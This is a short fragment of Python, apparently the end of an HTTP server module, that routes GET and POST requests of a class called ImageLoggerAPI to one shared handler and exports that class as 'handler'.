    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
